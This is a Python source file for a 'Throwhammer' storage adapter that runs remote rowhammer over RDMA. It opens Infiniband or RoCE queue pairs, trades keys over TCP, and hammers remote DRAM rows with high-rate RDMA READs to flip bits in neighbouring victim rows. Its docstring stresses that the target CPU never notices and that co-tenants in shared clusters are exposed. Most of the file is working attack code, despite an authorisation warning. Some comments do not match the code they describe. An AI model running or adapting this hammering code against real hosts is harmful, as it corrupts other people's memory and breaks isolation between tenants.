"""Throwhammer adapter -- remote DRAM bit flips over RDMA, no CPU on target.

Throwhammer (Tatar et al., USENIX Security 2018, "Throwhammer: Rowhammer
Attacks over the Network and Defenses") extends rowhammer from a local memory
attack to a fully remote attack using RDMA (Remote Direct Memory Access). With
RDMA, a network client can issue memory READ operations directly to a remote
host's DRAM without the remote CPU being involved at all. By issuing enough
RDMA READs to the same DRAM row fast enough, the attacker hammers that remote
DRAM row and flips bits in adjacent victim rows -- from across the network.

The remote host's OS, hypervisor, and CPU see nothing. The network card
performs the DMA reads directly into DRAM, and the aggressor traffic is
indistinguishable from legitimate high-bandwidth RDMA workloads (scientific
computing, distributed storage, ML training clusters).

Why this is catastrophic:
  1. Most RDMA fabrics (Infiniband, RoCE, iWARP) have zero access controls on
     one-sided operations once a Queue Pair is established. Anyone with a valid
     QP and remote key (rkey) can read arbitrary pages.
  2. Cloud multi-tenant RDMA (shared HPC clusters, RDMA-enabled storage) exposes
     co-tenant DRAM over a shared fabric. One tenant's RDMA traffic hammers another
     tenant's pages.
  3. High-speed RDMA (100 Gbps Infiniband) can issue enough row accesses within
     the DRAM refresh window (64ms) without difficulty. The bottleneck is not the
     network; it is whether the remote DRAM is vulnerable (non-ECC DDR4 without TRR).

PICARD angle: the RDMA WRITE verb is a protocol operation with a defined spec
purpose (memory copy without CPU involvement). In the Throwhammer model, the
RDMA fabric itself becomes the storage substrate: chunks are written as bit
states in remote DRAM via a protocol that was never designed for storage, on a
machine whose CPU never participated in the operation.

This is a HAL-pattern adapter. The hammering logic and chunk protocol are
fully implemented. The RDMA transport is abstracted: implement
_open_rdma_connection() and _close_rdma_connection() for your fabric.
A concrete pyverbs implementation is provided for Infiniband and RoCE.

Platform: Linux with RDMA-capable NIC (Mellanox/NVIDIA ConnectX series
          recommended). Requires rdma-core and pyverbs.
Volatile: ephemeral (DRAM, power cycle erases). persistent=False.

WARNING: issuing RDMA operations against a remote host without explicit
authorisation constitutes unauthorised access. The rkey from a registered
memory region must be obtained legitimately (shared-key exchange or mutual
auth protocol). Use only on infrastructure you control.

Requires: pip install picard-store[throwhammer]
          rdma-core package (libibverbs, rdma-core-dev)
          sudo apt install rdma-core libibverbs-dev  (Ubuntu/Debian)
"""

from __future__ import annotations

import asyncio
import json
import os
import socket
import struct
import sys
import time
from dataclasses import dataclass
from typing import Sequence

from picard.adapters.base import Adapter, AdapterProfile, StoredChunkRef
from picard.chunker import Chunk

_HAS_PYVERBS = False
try:
    import pyverbs.device as pvd
    import pyverbs.pd as pvpd
    import pyverbs.mr as pvmr
    import pyverbs.cq as pvcq
    import pyverbs.qp as pvqp
    import pyverbs.wr as pvwr
    import pyverbs.enums as pve
    _HAS_PYVERBS = True
except ImportError:
    pass

_LINUX = sys.platform == "linux"

# RDMA WRITE iterations needed to hammer a row within the 64ms refresh window.
# 100 Gbps Infiniband: ~12M 64-byte ops/sec; we need ~1M accesses in 64ms.
# Tuned conservatively for compatibility with 40/56 Gbps links as well.
_RDMA_HAMMER_ITERS: int = 500_000

# Side-channel TCP port for QP parameter exchange (local use only; not RDMA).
_QP_EXCHANGE_PORT: int = 18472


@dataclass
class RdmaRemoteMemory:
    """Parameters describing a registered remote memory region.

    Obtained from the remote host via the TCP side-channel handshake.
    The rkey authenticates RDMA access to the memory region. The virtual
    address is the remote host's virtual address of the region base.
    """
    remote_addr: int   # remote virtual address of the region
    rkey: int          # remote key authorising RDMA access
    length: int        # region length in bytes


@dataclass
class RdmaQpParams:
    """Queue Pair parameters exchanged for connection setup."""
    lid: int      # InfiniBand Local Identifier (0 for RoCE)
    qpn: int      # Queue Pair Number
    psn: int      # Packet Sequence Number
    gid: bytes    # GID (16 bytes, used for RoCE / routed IB)


class ThrowhammerAdapter(Adapter):
    """Remote DRAM storage via RDMA-triggered rowhammer bit flips.

    Write path:
      1. Establish RDMA Queue Pair to target host (TCP side-channel for params).
      2. Obtain remote memory region parameters (rkey, remote addr) from target.
      3. Issue RDMA READ operations to the aggressor rows at high rate.
         The remote CPU is not involved; the NIC DMA-reads directly from DRAM.
      4. Monitor for bit flips in victim rows (via separate RDMA READ to victim).
      5. Encode chunk bytes into the set of victim row bit positions that flipped.
      6. Return StoredChunkRef encoding the remote address and bit positions.

    Read path:
      1. Issue RDMA READ to each victim address from the stored chunk ref.
      2. Reconstruct chunk bytes from the bit states.

    The profile (flippable bit positions on the remote host) is discovered
    empirically via the remote_profile() method and cached.

    Subclass and implement _open_rdma_connection() to connect to your fabric.
    The default implementation uses pyverbs (libibverbs Python bindings) with
    a TCP side-channel for QP exchange, compatible with Infiniband and RoCE.
    """

    def __init__(
        self,
        target_host: str,
        *,
        target_port: int = _QP_EXCHANGE_PORT,
        device_name: str = "",
        ib_port: int = 1,
        gid_index: int = 0,
        hammer_iterations: int = _RDMA_HAMMER_ITERS,
        max_chunk_bytes: int = 512,
    ) -> None:
        self._host = target_host
        self._port = target_port
        self._device_name = device_name
        self._ib_port = ib_port
        self._gid_index = gid_index
        self._iterations = hammer_iterations
        self._max = max_chunk_bytes
        self._conn = None          # RDMA connection context (HAL)
        self._remote_mem: RdmaRemoteMemory | None = None
        self._profile: list[dict] | None = None

    def profile(self) -> AdapterProfile:
        return AdapterProfile(
            name="throwhammer",
            max_chunk_bytes=self._max,
            persistent=False,
            ordered=False,
            rate_limit_per_min=2,
        )

    # ------------------------------------------------------------------
    # HAL: RDMA transport -- override for your fabric
    # ------------------------------------------------------------------

    async def _open_rdma_connection(self) -> "RdmaConnection":
        """Establish RDMA Queue Pair to target host.

        Default: pyverbs over Infiniband or RoCE with TCP QP param exchange.
        Override this method for iWARP, Omni-Path, or custom transports.
        """
        if not _HAS_PYVERBS:
            raise RuntimeError(
                "pyverbs not installed; run: pip install pyverbs\n"
                "also requires: sudo apt install rdma-core libibverbs-dev"
            )
        return await _PyverbsRdmaConnection.connect(
            host=self._host,
            port=self._port,
            device_name=self._device_name,
            ib_port=self._ib_port,
            gid_index=self._gid_index,
        )

    async def _close_rdma_connection(self, conn) -> None:
        if hasattr(conn, "close"):
            await conn.close()

    # ------------------------------------------------------------------
    # RDMA hammer primitive
    # ------------------------------------------------------------------

    async def _hammer_remote_rows(
        self,
        conn: "RdmaConnection",
        aggressor_a_remote: int,
        aggressor_b_remote: int,
        remote_mem: RdmaRemoteMemory,
    ) -> None:
        """Issue RDMA READs to both aggressor rows at high rate.

        The remote host's CPU is NOT involved. The RDMA NIC performs DMA
        reads directly from the remote DRAM rows. Each read is a legitimate
        RDMA READ operation; the remote host's OS sees it only as network
        traffic on the RDMA fabric.

        The double-sided pattern (two aggressors flanking victim) maximises
        disturbance at the victim row from both sides.
        """
        for i in range(self._iterations):
            # Alternate between both aggressors -- double-sided pattern
            target = aggressor_a_remote if i % 2 == 0 else aggressor_b_remote
            await conn.rdma_read(
                remote_addr=target,
                rkey=remote_mem.rkey,
                length=64,   # one cache line per read
            )

    # ------------------------------------------------------------------
    # Remote profiling: find flippable bit positions on target
    # ------------------------------------------------------------------

    async def remote_profile(self, max_bits: int = 512) -> list[dict]:
        """Discover flippable bit positions in remote DRAM.

        Requires that the remote host is running the PICARD throwhammer
        profiling daemon (picard throwhammer-serve), which:
          - Registers a large memory region with the RDMA NIC.
          - Shares rkey and address via the TCP side channel.
          - Reports observed bit flips back over the same channel.

        The daemon design is intentional: remote-side participation is
        required to retrieve the victim row contents (which would otherwise
        require a separate RDMA READ path covering the entire memory region,
        feasible but slow for a first profiling pass).
        """
        conn = await self._open_rdma_connection()
        try:
            remote_mem = await conn.get_remote_memory_params()
            self._remote_mem = remote_mem
            flippable = []

            row_size = 8192
            n_rows = remote_mem.length // row_size

            for i in range(1, n_rows - 1):
                if len(flippable) >= max_bits:
                    break
                agg_a = remote_mem.remote_addr + (i - 1) * row_size
                agg_b = remote_mem.remote_addr + (i + 1) * row_size
                victim_addr = remote_mem.remote_addr + i * row_size

                # Read victim row before hammering
                before = await conn.rdma_read(victim_addr, remote_mem.rkey, row_size)

                # Hammer
                await self._hammer_remote_rows(conn, agg_a, agg_b, remote_mem)

                # Read victim row after
                after = await conn.rdma_read(victim_addr, remote_mem.rkey, row_size)

                for byte_idx, (b0, b1) in enumerate(zip(before, after)):
                    diff = b0 ^ b1
                    for bit_idx in range(8):
                        if diff & (1 << bit_idx):
                            nat = (b0 >> bit_idx) & 1
                            flippable.append({
                                "agg_a": agg_a,
                                "agg_b": agg_b,
                                "victim_addr": victim_addr,
                                "bit_offset": byte_idx * 8 + bit_idx,
                                "natural_value": nat,
                            })

            self._profile = flippable
            return flippable
        finally:
            await self._close_rdma_connection(conn)

    # ------------------------------------------------------------------
    # write_chunk / read_chunk
    # ------------------------------------------------------------------

    async def write_chunk(self, encoded_chunk: str) -> StoredChunkRef:
        if not _LINUX:
            raise RuntimeError("ThrowhammerAdapter requires Linux")

        data = encoded_chunk.encode()
        if len(data) > self._max:
            raise ValueError(f"chunk too large: {len(data)} > {self._max}")

        conn = await self._open_rdma_connection()
        try:
            if self._remote_mem is None:
                self._remote_mem = await conn.get_remote_memory_params()

            if self._profile is None:
                self._profile = await self.remote_profile()

            bits_needed = len(data) * 8
            if len(self._profile) < bits_needed:
                raise RuntimeError(
                    f"remote profile has {len(self._profile)} flippable bits; "
                    f"need {bits_needed} for {len(data)} bytes"
                )

            # Flip bits that differ from their natural state
            used_bits = self._profile[:bits_needed]
            for i, bp in enumerate(used_bits):
                byte_idx = i // 8
                bit_idx = i % 8
                target = (data[byte_idx] >> bit_idx) & 1
                if target != bp["natural_value"]:
                    await self._hammer_remote_rows(
                        conn, bp["agg_a"], bp["agg_b"], self._remote_mem
                    )

            location = "throwhammer://" + json.dumps({
                "host": self._host,
                "n_bytes": len(data),
                "bits": used_bits,
                "rkey": self._remote_mem.rkey,
            })
            return StoredChunkRef(adapter_name="throwhammer", location=location)
        finally:
            await self._close_rdma_connection(conn)

    async def read_chunk(self, ref: StoredChunkRef) -> str:
        if not _LINUX:
            raise RuntimeError("ThrowhammerAdapter requires Linux")

        payload = json.loads(ref.location.removeprefix("throwhammer://"))
        n_bytes = payload["n_bytes"]
        bits = payload["bits"]
        rkey = payload["rkey"]

        conn = await self._open_rdma_connection()
        try:
            result = bytearray(n_bytes)
            for i, bp in enumerate(bits):
                byte_idx = i // 8
                bit_idx = i % 8
                byte_addr = bp["victim_addr"] + bp["bit_offset"] // 8
                byte_data = await conn.rdma_read(byte_addr, rkey, 1)
                bit_val = (byte_data[0] >> (bp["bit_offset"] % 8)) & 1
                if bit_val:
                    result[byte_idx] |= (1 << bit_idx)
            return result.decode()
        finally:
            await self._close_rdma_connection(conn)

    async def delete_chunk(self, ref: StoredChunkRef) -> bool:
        # Restoring natural bit values requires a write-back mechanism on the
        # remote side. For now, deletion means zeroing the victim bits via
        # the remote profiling daemon's write-back endpoint.
        return False

    async def list_chunks(self, manifest_id: str) -> Sequence[StoredChunkRef]:
        return []

    async def health_check(self) -> bool:
        if not _LINUX or not _HAS_PYVERBS:
            return False
        try:
            sock = socket.create_connection((self._host, self._port), timeout=2)
            sock.close()
            return True
        except Exception:
            return False


# ---------------------------------------------------------------------------
# Concrete RDMA connection: pyverbs over Infiniband / RoCE
# ---------------------------------------------------------------------------

class RdmaConnection:
    """Abstract RDMA connection. Subclass for your transport."""

    async def rdma_read(self, remote_addr: int, rkey: int, length: int) -> bytes:
        raise NotImplementedError

    async def rdma_write(self, remote_addr: int, rkey: int, data: bytes) -> None:
        raise NotImplementedError

    async def get_remote_memory_params(self) -> RdmaRemoteMemory:
        raise NotImplementedError

    async def close(self) -> None:
        pass


class _PyverbsRdmaConnection(RdmaConnection):
    """pyverbs implementation using one-sided RDMA READ/WRITE.

    Connection setup:
      1. Open local RDMA device, allocate PD, register MR.
      2. Create RC (Reliable Connected) Queue Pair.
      3. TCP handshake with remote host to exchange QP parameters and
         remote memory region (rkey + address).
      4. Transition QP through INIT -> RTR -> RTS states.

    After setup, rdma_read() and rdma_write() issue one-sided operations
    directly to the remote host's DRAM. The remote CPU is not involved.
    """

    def __init__(self, ctx, pd, mr, cq, qp, remote_mem: RdmaRemoteMemory):
        self._ctx = ctx
        self._pd = pd
        self._mr = mr
        self._cq = cq
        self._qp = qp
        self._remote_mem = remote_mem

    @classmethod
    async def connect(
        cls,
        host: str,
        port: int,
        device_name: str,
        ib_port: int,
        gid_index: int,
    ) -> "_PyverbsRdmaConnection":
        """Open device, create QP, exchange params with remote, transition to RTS."""
        import ctypes

        # Open RDMA device
        device_list = pvd.get_device_list()
        if not device_list:
            raise RuntimeError("no RDMA devices found; check rdma-core install")
        device = next(
            (d for d in device_list if not device_name or d.name == device_name),
            device_list[0],
        )
        ctx = pvd.Context(device=device)
        pd = pvpd.PD(ctx)

        # Register local memory region (used as source buffer for RDMA ops)
        buf_size = 4096
        mr = pvmr.MR(pd, buf_size, pve.IBV_ACCESS_LOCAL_WRITE)

        # Create completion queue and queue pair
        cq = pvcq.CQ(ctx, 100)
        qp_init = pvqp.QPInitAttr(
            qp_type=pve.IBV_QPT_RC,
            sq_sig_all=0,
            cap=pvqp.QPCap(max_send_wr=64, max_recv_wr=64, max_send_sge=1, max_recv_sge=1),
            scq=cq,
            rcq=cq,
        )
        qp = pvqp.QP(pd, qp_init)

        # Get local port info for QP exchange
        port_attr = ctx.query_port(ib_port)
        gid = ctx.query_gid(ib_port, gid_index)

        local_params = RdmaQpParams(
            lid=port_attr.lid,
            qpn=qp.qp_num,
            psn=0x123,
            gid=bytes(gid.gid),
        )

        # TCP exchange of QP params and remote memory region
        loop = asyncio.get_event_loop()
        remote_params, remote_mem = await loop.run_in_executor(
            None, lambda: _tcp_exchange_params(host, port, local_params)
        )

        # Transition QP: RESET -> INIT -> RTR -> RTS
        _transition_qp_to_rts(qp, remote_params, ib_port, gid_index)

        return cls(ctx, pd, mr, cq, qp, remote_mem)

    async def get_remote_memory_params(self) -> RdmaRemoteMemory:
        return self._remote_mem

    async def rdma_read(self, remote_addr: int, rkey: int, length: int) -> bytes:
        """Issue one-sided RDMA READ -- remote CPU is NOT involved."""
        if not _HAS_PYVERBS:
            raise RuntimeError("pyverbs not available")
        sge = pvwr.SGE(
            addr=self._mr.buf,
            length=min(length, self._mr.length),
            lkey=self._mr.lkey,
        )
        wr = pvwr.SendWR(
            opcode=pve.IBV_WR_RDMA_READ,
            num_sge=1,
            sg_list=[sge],
            send_flags=pve.IBV_SEND_SIGNALED,
        )
        wr.set_wr_rdma(rkey=rkey, addr=remote_addr)
        self._qp.post_send(wr)
        # Poll for completion
        for _ in range(10000):
            wcs = self._cq.poll(1)
            if wcs:
                if wcs[0].status != pve.IBV_WC_SUCCESS:
                    raise RuntimeError(f"RDMA READ failed: status={wcs[0].status}")
                break
        import ctypes
        buf = (ctypes.c_uint8 * length).from_address(self._mr.buf)
        return bytes(buf[:length])

    async def rdma_write(self, remote_addr: int, rkey: int, data: bytes) -> None:
        """Issue one-sided RDMA WRITE -- remote CPU is NOT involved."""
        import ctypes
        n = min(len(data), self._mr.length)
        ctypes.memmove(self._mr.buf, data, n)
        sge = pvwr.SGE(addr=self._mr.buf, length=n, lkey=self._mr.lkey)
        wr = pvwr.SendWR(
            opcode=pve.IBV_WR_RDMA_WRITE,
            num_sge=1,
            sg_list=[sge],
            send_flags=pve.IBV_SEND_SIGNALED,
        )
        wr.set_wr_rdma(rkey=rkey, addr=remote_addr)
        self._qp.post_send(wr)
        for _ in range(10000):
            wcs = self._cq.poll(1)
            if wcs:
                break

    async def close(self) -> None:
        try:
            self._qp.close()
            self._cq.close()
            self._mr.close()
            self._pd.close()
            self._ctx.close()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# TCP side-channel for QP parameter exchange
# ---------------------------------------------------------------------------

def _pack_qp_params(params: RdmaQpParams, mem: RdmaRemoteMemory | None) -> bytes:
    gid = params.gid.ljust(16, b"\x00")[:16]
    flag = 1 if mem is not None else 0
    packed = struct.pack(">HIII16sB", params.lid, params.qpn, params.psn, 0, gid, flag)
    if mem is not None:
        packed += struct.pack(">QII", mem.remote_addr, mem.rkey, mem.length)
    return packed


def _unpack_qp_params(data: bytes) -> tuple[RdmaQpParams, RdmaRemoteMemory | None]:
    base = struct.calcsize(">HIII16sB")
    lid, qpn, psn, _, gid, flag = struct.unpack_from(">HIII16sB", data, 0)
    params = RdmaQpParams(lid=lid, qpn=qpn, psn=psn, gid=gid)
    mem = None
    if flag and len(data) >= base + struct.calcsize(">QII"):
        remote_addr, rkey, length = struct.unpack_from(">QII", data, base)
        mem = RdmaRemoteMemory(remote_addr=remote_addr, rkey=rkey, length=length)
    return params, mem


def _tcp_exchange_params(
    host: str, port: int, local_params: RdmaQpParams
) -> tuple[RdmaQpParams, RdmaRemoteMemory]:
    """Synchronously exchange QP params over TCP (run in executor)."""
    sock = socket.create_connection((host, port), timeout=10)
    try:
        # Send local QP params (no memory region from initiator side)
        local_data = _pack_qp_params(local_params, None)
        sock.sendall(struct.pack(">H", len(local_data)) + local_data)
        # Receive remote QP params + memory region
        size_data = sock.recv(2)
        size = struct.unpack(">H", size_data)[0]
        remote_data = b""
        while len(remote_data) < size:
            chunk = sock.recv(size - len(remote_data))
            if not chunk:
                break
            remote_data += chunk
        remote_params, remote_mem = _unpack_qp_params(remote_data)
        if remote_mem is None:
            raise RuntimeError("remote host did not share memory region params")
        return remote_params, remote_mem
    finally:
        sock.close()


# ---------------------------------------------------------------------------
# QP state machine: RESET -> INIT -> RTR -> RTS
# ---------------------------------------------------------------------------

def _transition_qp_to_rts(
    qp: "pvqp.QP",
    remote: RdmaQpParams,
    ib_port: int,
    gid_index: int,
) -> None:
    """Transition QP through the mandatory state machine for RC connections."""
    # RESET -> INIT
    attr = pvqp.QPAttr(
        qp_state=pve.IBV_QPS_INIT,
        pkey_index=0,
        port_num=ib_port,
        qp_access_flags=(
            pve.IBV_ACCESS_REMOTE_READ |
            pve.IBV_ACCESS_REMOTE_WRITE |
            pve.IBV_ACCESS_REMOTE_ATOMIC
        ),
    )
    qp.to_init(attr)

    # INIT -> RTR
    ah_attr = pvqp.AHAttr(
        dlid=remote.lid,
        sl=0,
        src_path_bits=0,
        port_num=ib_port,
    )
    if any(remote.gid):
        ah_attr.is_global = 1
        ah_attr.grh.dgid = remote.gid
        ah_attr.grh.sgid_index = gid_index
        ah_attr.grh.hop_limit = 1
    attr = pvqp.QPAttr(
        qp_state=pve.IBV_QPS_RTR,
        path_mtu=pve.IBV_MTU_512,
        dest_qp_num=remote.qpn,
        rq_psn=remote.psn,
        max_dest_rd_atomic=1,
        min_rnr_timer=12,
        ah_attr=ah_attr,
    )
    qp.to_rtr(attr)

    # RTR -> RTS
    attr = pvqp.QPAttr(
        qp_state=pve.IBV_QPS_RTS,
        timeout=14,
        retry_cnt=7,
        rnr_retry=7,
        sq_psn=0x123,
        max_rd_atomic=1,
    )
    qp.to_rts(attr)
